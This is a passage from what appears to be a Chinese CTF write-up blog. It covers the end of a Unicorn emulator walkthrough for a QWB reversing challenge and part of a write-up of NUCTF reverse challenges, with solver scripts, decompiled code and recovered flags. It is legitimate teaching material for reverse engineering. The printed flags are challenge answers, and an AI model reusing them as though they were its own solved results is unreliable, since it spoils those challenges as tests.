class="hljs-comment">#print(hex(v35))</span><br>        v35 = rol(v35, <span class="hljs-number">13</span>, <span class="hljs-number">64</span>)<br>        <span class="hljs-comment">#print(hex(v35))</span><br>        <span class="hljs-keyword">if</span> (n &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>:<br>            v35 = (data2 ^ (data1 + v35)) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>        <span class="hljs-keyword">if</span> (n &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span>:<br>            v35 ^= (data1 + data2) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>        <span class="hljs-keyword">if</span> (n &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span>:<br>            v35 ^= (data2 ^ data1) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>        <span class="hljs-keyword">if</span> (n &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span>:<br>            v35 += (data1 + data2) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>    <span class="hljs-keyword">return</span> v35 &amp; <span class="hljs-number">0xffffffffffffffff</span>, fs<br>  <br>我们先将最后一组数据进行异或得到上层数据。<br><br>flags = [<span class="hljs-number">0x67616c66</span>, <span class="hljs-number">0x47414c46</span>, <span class="hljs-number">0x7b627771</span>, <span class="hljs-number">0x7b425751</span>]   <span class="hljs-comment">#四个flag_head：qwb&#123;，QWB&#123;，flag&#123;，FLAG&#123;</span><br>xor_data = [<span class="hljs-number">0x178DEC4F232DDB6E</span>, <span class="hljs-number">0xC2AAB7D6D2A167C3</span>, <span class="hljs-number">0xF1AB91F72761A80F</span>, <span class="hljs-number">0x3DCEDC28076C41A</span>]  <span class="hljs-comment">#对应上图v2</span><br>cmp_data = [<span class="hljs-number">0x3EC81D9432CEF584</span>, <span class="hljs-number">0xB649A4DCD6BD24FE</span>, <span class="hljs-number">0xC5927F0B767A787D</span>, <span class="hljs-number">0x1F245B7F751BB52E</span>]   <span class="hljs-comment">#对应上图v6</span><br>mm_crc32 = [<span class="hljs-number">0x11dc4d59</span>, <span class="hljs-number">0x788bcf1a</span>, <span class="hljs-number">0x2a9f67b4</span>, <span class="hljs-number">0x63756b29</span>]<br>xor_data1 = []  <span class="hljs-comment">#对应check_time函数下的  *（input1+m）</span><br>tmp1 = <span class="hljs-string">b&quot;&quot;</span>  <span class="hljs-comment"># _mm_crc32_u32循环中所用到的数据</span><br><span class="hljs-comment"># 计算tmp1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    data1 = p64(xor_data[i])<br>    data2 = p64(cmp_data[i])<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        tmp1 += <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">chr</span>(data1[j] ^ data2[j]), encoding = <span class="hljs-string">&quot;latin&quot;</span>)<br><br>在往上一步发现time不得而知，因为flag前四字节只有四种格式，所以我们采用爆破的方式。<br><span class="hljs-comment"># 得到需要与input异或的数据</span><br>fs_0 = <span class="hljs-number">0x5249415452455451</span><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    fs_0 = change_key(fs_0)<br>    v36 = fs_0<br>    v35 = m<br>    a, fs_0 = check_time(v35, fs_0)<br>    <span class="hljs-comment">#print(hex(v36))</span><br>    <span class="hljs-comment">#print(hex(a))</span><br>    xor_data1.append((v36 + a) &amp; <span class="hljs-number">0xff</span>)<br><span class="hljs-built_in">print</span>(xor_data1)<br><span class="hljs-comment">#得到异或后的flag_head，用于爆破 time/0xe10 的值</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    flag_head = p32(flags[i])<br>    s = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        s += <span class="hljs-built_in">chr</span>(flag_head[j] ^ xor_data1[i*<span class="hljs-number">4</span>+j]).encode(<span class="hljs-string">&quot;latin&quot;</span>)<br>    flags[i] = u32(s)<br><span class="hljs-comment"># 爆破，我们只需要前四个字节</span><br>cmp_dword = u32(tmp1[:<span class="hljs-number">4</span>])<br><span class="hljs-built_in">print</span>(flags)<br><span class="hljs-comment">#脚本写到这里，发现_mm_crc32_u32并不是计算crc32，所以最后使用C语言跑出来四个flag_head 经过这个函数得到的值。 这里要去执行c语言中的block1</span><br>mm_crc32 = [<span class="hljs-number">0x11dc4d59</span>, <span class="hljs-number">0x788bcf1a</span>, <span class="hljs-number">0x2a9f67b4</span>, <span class="hljs-number">0x63756b29</span>]<br>fs_0 = <span class="hljs-number">0x7177625F32303231</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    tmp2 = cmp_dword - mm_crc32[i]<br>    check_result,a = check_time(tmp2, fs_0)<br>    <span class="hljs-comment">#print(hex(check_result))</span><br>    <span class="hljs-keyword">if</span> check_result == <span class="hljs-number">0x1C986C3B22EA63E5</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%x&quot;</span> % tmp2)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#爆破出time，我们就可以使用cmp_data进行解密了。</span><br>time = <span class="hljs-number">0x6e191</span><br><span class="hljs-built_in">print</span>(xor_data1)<br>cmp_data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(tmp1), <span class="hljs-number">4</span>):<br>    cmp_data.append(u32(tmp1[i:i+<span class="hljs-number">4</span>]))<br><span class="hljs-built_in">print</span>(cmp_data)<br><span class="hljs-comment">#执行c语言中的block2，getflag</span><br></code></pre></td></tr></table></figure><p>C语言代码；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Created by 沉默 on 2021/8/5.</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">uint8_t</span> xor_data[<span class="hljs-number">32</span>] = &#123;<span class="hljs-number">165</span>, <span class="hljs-number">220</span>, <span class="hljs-number">121</span>, <span class="hljs-number">181</span>, <span class="hljs-number">173</span>, <span class="hljs-number">29</span>, <span class="hljs-number">65</span>, <span class="hljs-number">7</span>, <span class="hljs-number">237</span>, <span class="hljs-number">84</span>, <span class="hljs-number">204</span>, <span class="hljs-number">183</span>, <span class="hljs-number">178</span>, <span class="hljs-number">23</span>, <span class="hljs-number">228</span>, <span class="hljs-number">173</span>, <span class="hljs-number">33</span>, <span class="hljs-number">228</span>, <span class="hljs-number">94</span>, <span class="hljs-number">150</span>, <span class="hljs-number">235</span>, <span class="hljs-number">53</span>, <span class="hljs-number">196</span>, <span class="hljs-number">224</span>, <span class="hljs-number">80</span>, <span class="hljs-number">127</span>, <span class="hljs-number">120</span>, <span class="hljs-number">95</span>, <span class="hljs-number">136</span>, <span class="hljs-number">104</span>, <span class="hljs-number">38</span>, <span class="hljs-number">98</span>&#125;;<br>    <span class="hljs-keyword">uint32_t</span> cmp_data[<span class="hljs-number">8</span>] = &#123;<span class="hljs-number">300101354</span>, <span class="hljs-number">692449755</span>, <span class="hljs-number">68961085</span>, <span class="hljs-number">1961038602</span>, <span class="hljs-number">1360777330</span>, <span class="hljs-number">876211964</span>, <span class="hljs-number">4117590324</span>, <span class="hljs-number">486061757</span>&#125;;<br>    <span class="hljs-keyword">uint32_t</span> flag_head[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">3524833475</span>, <span class="hljs-number">1073762795</span>, <span class="hljs-number">3433964444</span>, <span class="hljs-number">3601219811</span>&#125;;<br>    <span class="hljs-keyword">uint32_t</span> flag_tmp[<span class="hljs-number">8</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">uint32_t</span> * xor_data_dword = (<span class="hljs-keyword">uint32_t</span>  *)xor_data;<br><br>    <span class="hljs-comment">//block1：get mm_crc32</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, _mm_crc32_u32(<span class="hljs-number">0</span>, flag_head[i]));<br>    &#125;<br>    <span class="hljs-comment">//block2：get flag before xor</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; ++i) &#123; <span class="hljs-comment">// 4 * 8</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint32_t</span> val = <span class="hljs-number">0</span>; val != <span class="hljs-number">0xffffffff</span>; ++val) &#123;<br>            <span class="hljs-keyword">if</span> (cmp_data[i] - <span class="hljs-number">0x6e191</span> == _mm_crc32_u32(<span class="hljs-number">0</span>, val)) &#123;<br>                flag_tmp[i] = val;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//get flag</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; ++i) &#123;<br>        flag_tmp[i] ^= xor_data_dword[i];<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, (<span class="hljs-keyword">char</span> *)flag_tmp);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>注意_mm_crc32_u32是在sse4.2指令集下。</p><p><img src="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/image-20210806145945570.png" alt="image-20210806145945570"></p><h1 id="熟悉API"><a href="#熟悉API" class="headerlink" title="熟悉API"></a>熟悉API</h1><p>最后，我们以一个非常简单的ctf题熟悉一下常用unicorn的api。</p><p><img src="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/image-20210806172612763.png" alt="image-20210806172612763"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> unicorn.x86_const <span class="hljs-keyword">import</span> *<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">name</span>):</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>        <span class="hljs-keyword">return</span> fp.read()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_code</span>(<span class="hljs-params">mu, address, size, user_data</span>):</span><br>    <span class="hljs-comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; % (address, size))</span><br><br>    <span class="hljs-keyword">if</span> address == <span class="hljs-number">0x1241</span>:<br>        <span class="hljs-comment">#输出flag</span><br>        flag = mu.mem_read(<span class="hljs-number">0x1200</span>, <span class="hljs-number">0x22</span>)<br>        <span class="hljs-built_in">print</span>(flag)<br>    <span class="hljs-keyword">if</span> address == <span class="hljs-number">0x1235</span>:<br>        <span class="hljs-comment">#将字符串偏移写入bx寄存器</span><br>        mu.reg_write(UC_X86_REG_BX, <span class="hljs-number">0x1200</span>)<br>        <span class="hljs-comment">#设置ip寄存器</span><br>        mu.reg_write(UC_X86_REG_IP, <span class="hljs-number">0x1239</span>)<br><br><br><span class="hljs-comment"># 模拟器开始的内存地址</span><br>BASE = <span class="hljs-number">0x1000</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Emulate asm.exe:&quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment">#初始化模拟器为x86_16</span><br>    mu = Uc(UC_ARCH_X86, UC_MODE_16)<br>    <span class="hljs-comment">#为这个模拟器分配1M内存</span><br>    mu.mem_map(BASE, <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>, UC_PROT_ALL)<br>    <span class="hljs-comment">#将程序内容写入内存</span><br>    mu.mem_write(BASE, read(<span class="hljs-string">&quot;./asm.exe&quot;</span>))<br>    <span class="hljs-comment">#模拟代码执行（emu_start有四个参数，后两个参数是模拟执行的时间和需要执行的指令数目，这里后两个参数为空，则以无限时间和无限指令模拟执行）</span><br>    mu.hook_add(UC_HOOK_CODE, hook_code)<br>    <span class="hljs-comment"># 通过010Editor查看可知，程序开始的偏移在0x200处。</span><br>    mu.emu_start(<span class="hljs-number">0x1232</span>, <span class="hljs-number">0x1255</span>)<br><br><span class="hljs-keyword">except</span> UcError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ERROR: %s&quot;</span> % e)<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">从毫无头绪到参考大佬博客，编写脚本完成解题，收获了很多东西，对unicorn有了一定的了解，bindiff工具的使用，控制流重建思路，<span class="hljs-keyword">python</span>进行汇编代码重写，虽然花费了几天时间，但是完全搞懂一道从没接触过的题目还是很值得的。至此，对于unicorn算是入门了，我也试过写一些复杂代码的模拟执行，但都失败了，之后还要学习高级用法，例如去除ollvm混淆这些。<br></code></pre></td></tr></table></figure><p><strong>参考</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">unicornAPI:https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/kabeor/</span>Micro-Unicorn-Engine-API-Documentation<span class="hljs-regexp">/blob/m</span>aster/Micro%<span class="hljs-number">20</span>Unicorn-Engine%<span class="hljs-number">20</span>API%<span class="hljs-number">20</span>Documentation.md<br>unicorn官网：https:<span class="hljs-regexp">//</span>www.unicorn-engine.org<span class="hljs-regexp">/docs/</span><br>unicorn_like_pro的wp:<br>https:<span class="hljs-regexp">//</span>bbs.pediy.com/thread-<span class="hljs-number">268125</span>.htm<span class="hljs-comment">#msg_header_h1_0</span><br>https:<span class="hljs-regexp">//</span>panda0s.top<span class="hljs-regexp">/2021/</span><span class="hljs-number">06</span><span class="hljs-regexp">/14/</span>%E5%BC%BA%E7%BD%<span class="hljs-number">91</span>%E6%<span class="hljs-number">9</span>D%AF-unicorn-like-a-pro/<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NUCTF-部分wp</title>
    <link href="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/"/>
    <url>/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="encryption"><a href="#encryption" class="headerlink" title="encryption"></a>encryption</h2><p>程序有自加密代码，直接动态调试得到解密的代码。</p><p>根据特征发现是rc4加密，找到key和最终比较的结果，解密即可。</p><p><img src="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/image-20210609134702424.png" alt="image-20210609134702424"></p><p><img src="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/image-20210609134710786.png" alt="image-20210609134710786"></p><p>得到key：r3v3rs3_1s_s0_3z</p><p><img src="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/image-20210609135158392.png" alt="image-20210609135158392"></p><p><img src="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/image-20210609135211161.png" alt="image-20210609135211161"></p><p>最终比较的结果：91747F215A6CB4DB11A52D12D40F1970</p><p>进行解密：</p><p><img src="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/image-20210609135239290.png" alt="image-20210609135239290"></p><p>flag为：DACTF{7ce6798bc692ef04c6273a39d94dff9f}</p><h2 id="vmm"><a href="#vmm" class="headerlink" title="vmm"></a>vmm</h2><p>给了opcode，所以去找opcode所对应的指令函数即可。</p><p><img src="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/image-20210609135505266.png" alt="image-20210609135505266"></p><p><img src="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/image-20210609135752265.png" alt="image-20210609135752265"></p><p>修改完函数名再回到第一张图里的函数，</p><p><img src="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/image-20210609135905057.png" alt="image-20210609135905057"></p><p>然后去分析这些函数。</p><p>这里要注意num_5这个函数：</p><p><img src="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/image-20210609140032448.png" alt="image-20210609140032448"></p><p>如果在调试，则会执行减1运算。</p><p>最后得出opcode指令：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">6 </span><span class="hljs-keyword">input</span><br><span class="hljs-symbol">7 </span>下一个-<span class="hljs-number">1</span><br><span class="hljs-symbol">2 </span>交换<br><span class="hljs-symbol">0 </span>+<span class="hljs-number">2</span><br><span class="hljs-symbol">3 </span>位运算<br><span class="hljs-symbol">1 </span>^<span class="hljs-number">0</span>x66<br><span class="hljs-symbol">5 </span>无操作<br></code></pre></td></tr></table></figure><p>得到最后比较的结果：</p><p><img src="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/image-20210609140155634.png" alt="image-20210609140155634"></p><p><img src="/2021/06/09/NUCTF-%E9%83%A8%E5%88%86wp/image-20210609140202282.png" alt="image-20210609140202282"></p><p>写python脚本进行还原：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span> =<span class="hljs-meta"> [0x00000066, 0x0000006B, 0x00000067, 0x00000063, 0x000000DE, 0x0000006F, 0x0000006F, 0x00000069, 0x000000F6, 0x00000026, 0x00000023, 0x00000079, 0x00000061, 0x000000F6, 0x000000AA, 0x00000039, 0x000000E2, 0x00000074, 0x00000003, 0x00000073, 0x00000072, 0x00000039, 0x00000031, 0x00000001, 0x00000067, 0x00000012, 0x000000FA, 0x00000000, 0x0000006E, 0x00000067, 0x0000007D, 0x00000040]</span><br><span class="hljs-attribute">opcode</span> = <span class="hljs-string">&quot;720322033020331321721517131022&quot;</span><br><span class="hljs-attribute">for</span> j in range(len(opcode)):<br>    <span class="hljs-attribute">if</span> opcode[j] == <span class="hljs-string">&quot;0&quot;</span>:<br>        <span class="hljs-attribute">a</span>[j+<span class="hljs-number">1</span>] -= <span class="hljs-number">2</span><br>    <span class="hljs-attribute">elif</span> opcode[j] == <span class="hljs-string">&quot;1&quot;</span>:<br>        <span class="hljs-attribute">a</span>[j+<span class="hljs-number">1</span>] ^= <span class="hljs-number">0</span>x<span class="hljs-number">66</span><br>    <span class="hljs-attribute">elif</span> opcode[j] == <span class="hljs-string">&quot;3&quot;</span>:<br>        <span class="hljs-attribute">for</span> d in range(<span class="hljs-number">256</span>):<br>            <span class="hljs-attribute">v2</span> = <span class="hljs-number">0</span><br>            <span class="hljs-attribute">a1</span> = d<br>            <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">8</span>):<br>                <span class="hljs-attribute">if</span> (a<span class="hljs-number">1</span> &amp; (<span class="hljs-number">1</span> &lt;&lt; i)) &gt; <span class="hljs-number">0</span>:<br>                    <span class="hljs-attribute">v2</span> |= (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-number">7</span> - i)) &amp; <span class="hljs-number">0</span>xff<br>            <span class="hljs-attribute">if</span> v<span class="hljs-number">2</span> == a[j+<span class="hljs-number">1</span>]:<br>                <span class="hljs-attribute">a</span>[j+<span class="hljs-number">1</span>] = a<span class="hljs-number">1</span><br>                <span class="hljs-attribute">break</span><br>    <span class="hljs-attribute">elif</span> opcode[j] == <span class="hljs-string">&quot;5&quot;</span>:<br>        <span class="hljs-attribute">a</span>[j+<span class="hljs-number">1</span>] += <span class="hljs-number">0</span><br>    <span class="hljs-attribute">elif</span> opcode[j] == <span class="hljs-string">&quot;7&quot;</span>:<br>        <span class="hljs-attribute">a</span>[j + <span class="hljs-number">1</span>] += <span class="hljs-number">1</span><br><span class="hljs-attribute">for</span> j in range(len(opcode)-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>    <span class="hljs-attribute">if</span> opcode[j] == <span class="hljs-string">&quot;2&quot;</span>:<br>        <span class="hljs-attribute">s</span> = a[j+<span class="hljs-number">1</span>]<br>        <span class="hljs-attribute">a</span>[j+<span class="hljs-number">1</span>] = a[j+<span class="hljs-number">2</span>]<br>        <span class="hljs-attribute">a</span>[j+<span class="hljs-number">2</span>] = s<br><span class="hljs-attribute">result</span> = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attribute">for</span> i in range(len(a)):<br>    <span class="hljs-attribute">result</span> += chr(a[i])<br><span class="hljs-attribute">print</span>(result)<br></code></pre></td></tr></table></figure><p>flag为：flag{goood!_yoU_Gett_r1ght_fl@g}</p><h2 id="anbug"><a href="#anbug" class="headerlink" title="anbug"></a>anbug</h2><p>没有符号表，直接动态调试。</p><p>关键地方做了注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs c">  sub_4A1640(&amp;unk_4A88A0, <span class="hljs-string">&quot;Welcome,Please Input\n&quot;</span>);<br>  v0 = (<span class="hljs-keyword">void</span> *)sub_4A40C0(<span class="hljs-number">32</span>i64);<br>  sub_491C10(v0);<br>  Block = v0;<br>  sub_4A2810((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span>)&amp;off_4A8540, v0);<span class="hljs-comment">// scanf</span><br>  v1 = (<span class="hljs-keyword">void</span> *)sub_4A40C0(<span class="hljs-number">24</span>i64);<br>  sub_48EA20(v1);<br>  v44 = v1;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    v2 = i;<br>    <span class="hljs-keyword">if</span> ( v2 &gt;= sub_42AF30((__int64)Block) )<br>      <span class="hljs-keyword">break</span>;<br>    v29 = *(<span class="hljs-keyword">char</span> *)sub_490290(Block, i);<br>    sub_48E8E0(v44, &amp;v29);<br>  &#125;<br>  v3 = Block;<br>  <span class="hljs-keyword">if</span> ( Block )<br>  &#123;<br>    sub_491F50(Block);<br>    j_free(v3);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int64)sub_429600(v44) &lt;= <span class="hljs-number">0x23</span> )<span class="hljs-comment">// 长度大于35</span><br>  &#123;<br>    v4 = (__int64 *)sub_4A4200(<span class="hljs-number">8</span>i64);<br>    v5 = sub_4A40C0(<span class="hljs-number">16</span>i64);<br>    sub_46CA50(v5, <span 